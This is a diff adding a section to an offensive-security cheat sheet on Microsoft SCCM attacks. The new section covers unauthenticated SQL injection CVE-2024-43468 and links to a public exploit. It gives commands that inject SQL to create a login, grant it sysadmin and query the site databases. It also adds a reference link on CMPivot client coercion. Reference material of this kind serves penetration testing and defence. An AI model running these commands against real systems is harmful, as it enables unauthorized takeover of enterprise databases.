@@ -233,6 +233,18 @@ From a remote machine.
     ```
 
 
+### Unauthenticated SQL Injection - CVE-2024-43468
+
+* [synacktiv/CVE-2024-43468](https://github.com/synacktiv/CVE-2024-43468) - Microsoft Configuration Manager (ConfigMgr / SCCM) 2403 Unauthenticated SQL injections (CVE-2024-43468) exploit
+
+```ps1
+$ CVE-2024-43468.py -t cmc.corp.local -sql "create login [CORP\user1] from windows ; exec master.dbo.sp_addsrvrolemember [CORP\user1], 'sysadmin'"
+$ mssqlclient.py -debug -windows-auth 'CORP/user1:xxx'@cmc-db.corp.local
+SQL> select name from sysdatabases where name like 'CM_%'
+```
+
+
+
 ## SCCM Relay
 
 ### TAKEOVER1 - Low Privileges to Database Administrator - MSSQL relay
@@ -298,3 +310,4 @@ CcmExec is a service native to SCCM Windows clients that is executed on every in
 * [SCCM / MECM LAB - Part 0x1 - Recon and PXE - mayfly - Mar 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x1/)
 * [SCCM / MECM LAB - Part 0x2 - Low user - mayfly - Mar 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x2/)
 * [SCCM / MECM LAB - Part 0x3 - Admin User - mayfly - Apr 3, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x3/)
+* [Further Adventures With CMPivot — Client Coercion - Diego Lomellini - Feb 3, 2025](https://posts.specterops.io/further-adventures-with-cmpivot-client-coercion-38b878b740ac)
